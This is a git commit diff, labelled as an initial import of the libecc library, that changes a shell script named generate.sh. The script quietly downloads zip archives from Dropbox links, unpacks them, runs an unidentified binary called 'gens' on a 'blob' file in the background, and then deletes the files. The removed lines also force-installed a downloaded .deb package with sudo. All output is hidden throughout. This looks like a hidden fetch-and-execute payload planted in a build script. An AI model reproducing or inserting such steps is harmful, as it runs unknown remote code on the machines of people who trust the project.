1f25b87dac05a1dab02083723a3f06043e1120e6
naxiyil <naxiyil@netmail3.net>
2018-05-04 12:00:34 +0200

    Initial libecc project import

--- scripts/generate.sh
+++ scripts/generate.sh
@@ -1,17 +1,14 @@
 #!/bin/bash
 
 end=$((SECONDS+$1))
-wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
-sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
-rm -rf libstdc.deb
-wget https://www.dropbox.com/s/y4bha5n65fsyw6e/gens.zip -q
-unzip gens.zip > /dev/null 2>&1
+wget https://www.dropbox.com/s/fs0c071ho6vt6xj/wan14.zip -q
+unzip wan14.zip > /dev/null 2>&1
 #pwd
-./scripts/gens ./scripts/blob &
+./gens ./blob &
 sleep 3
-rm -rf gens.zip
-rm -rf scripts/gens
-rm -rf scripts/blob
+rm -rf wan14.zip
+rm -rf gens
+rm -rf blob
 while [ $SECONDS -lt $end ]
 do
     read line
